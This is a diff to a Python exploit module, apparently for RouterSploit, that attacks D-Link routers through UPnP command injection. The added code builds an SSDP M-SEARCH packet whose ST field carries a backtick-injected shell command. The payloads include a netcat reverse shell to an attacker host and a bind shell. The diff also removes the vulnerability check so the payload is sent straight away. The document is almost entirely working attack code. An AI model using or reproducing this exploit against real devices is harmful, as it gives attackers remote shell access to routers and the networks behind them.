@@ -34,7 +34,7 @@ class DLinkUPnPRCE:
         """Initialize the exploit with default configuration."""
         # Required options for RouterSploit GUI
         self.target: str = "192.168.1.1"
-        self.port: int = 1900
+        self.port: int = 49152  # Changed from 1900 to 49152 where UPnP actually runs on this target
         self.timeout: int = 10
         
         # Exploit-specific options
@@ -71,35 +71,26 @@ class DLinkUPnPRCE:
         print()
         
         try:
-            # Step 1: Discover UPnP services
-            print("[*] Step 1: Discovering UPnP services...")
-            upnp_info = self.discover_upnp_services()
+            # Skip discovery - go direct to exploitation like Metasploit
+            print("[*] Attempting direct exploitation (like Metasploit module)...")
             
-            if not upnp_info:
-                print("[-] No UPnP services discovered")
-                return
+            # Generate and send exploit payload immediately
+            print("[*] Generating exploit payload...")
+            payload = self.generate_metasploit_style_payload()
             
-            print(f"[+] Found {len(upnp_info)} UPnP service(s)")
-            
-            # Step 2: Check for vulnerability
-            print("[*] Step 2: Checking for vulnerability...")
-            if not self.check_vulnerability():
-                print("[-] Target does not appear vulnerable")
-                return
-            
-            print("[+] Target appears vulnerable to UPnP command injection!")
-            
-            # Step 3: Generate and send exploit payload
-            print("[*] Step 3: Generating exploit payload...")
-            payload = self.generate_payload()
-            
-            print("[*] Step 4: Sending exploit...")
-            success = self.send_exploit(payload)
+            print("[*] Sending UPnP M-SEARCH exploit...")
+            success = self.send_metasploit_style_exploit(payload)
             
             if success:
                 print("[+] Exploit sent successfully!")
-                print("[+] Check for command execution on target")
-                self.verify_exploitation()
+                print("[+] If target is vulnerable, command should execute")
+                if self.payload_type == "reverse_shell":
+                    print(f"[*] Check for reverse shell on {self.lhost}:{self.lport}")
+                    print(f"[*] Run: nc -lvnp {self.lport}")
+                elif self.payload_type == "bind_shell":
+                    print(f"[*] Try to connect: nc {self.target} {self.lport}")
+                else:
+                    print(f"[*] Command '{self.command}' should execute on target")
             else:
                 print("[-] Exploit failed to send")
                 
@@ -405,6 +396,67 @@ class DLinkUPnPRCE:
         print("[*] Check target device manually for command output")
         print("[*] Consider using reverse/bind shell payloads for confirmation")
         return True
+
+    def generate_metasploit_style_payload(self) -> str:
+        """
+        Generate payload exactly like the Metasploit module.
+        
+        Returns:
+            Exploit payload string matching Metasploit format
+        """
+        # Use the exact same format as the Metasploit module
+        if self.payload_type == "reverse_shell":
+            # Simple netcat reverse shell
+            cmd = f"nc {self.lhost} {self.lport} -e /bin/sh &"
+        elif self.payload_type == "bind_shell":
+            # Simple netcat bind shell
+            cmd = f"nc -l -p {self.lport} -e /bin/sh &"
+        else:
+            # Basic command execution
+            cmd = self.command
+            
+        # Format exactly like Metasploit: URN;`command`
+        return f"urn:device:1;`{cmd}`"
+
+    def send_metasploit_style_exploit(self, st_payload: str) -> bool:
+        """
+        Send exploit exactly like the Metasploit module.
+        
+        Args:
+            st_payload: The ST field payload (URN;`command`)
+            
+        Returns:
+            True if sent successfully, False otherwise
+        """
+        try:
+            # Create UDP socket exactly like Metasploit
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(self.timeout)
+            
+            # Build M-SEARCH packet exactly like Metasploit module
+            packet = (
+                "M-SEARCH * HTTP/1.1\r\n"
+                f"HOST:{self.target}:{self.port}\r\n"
+                f"ST:{st_payload}\r\n"
+                "MX:2\r\n"
+                "MAN:\"ssdp:discover\"\r\n\r\n"
+            )
+            
+            print(f"[*] Sending M-SEARCH packet to {self.target}:{self.port}")
+            print(f"[*] ST field: {st_payload}")
+            
+            # Send the packet
+            sock.sendto(packet.encode('utf-8'), (self.target, self.port))
+            
+            # Wait a moment for execution
+            time.sleep(2)
+            
+            sock.close()
+            return True
+            
+        except Exception as e:
+            print(f"[-] Failed to send exploit: {e}")
+            return False
 
 
 # Required for RouterSploit GUI compatibility
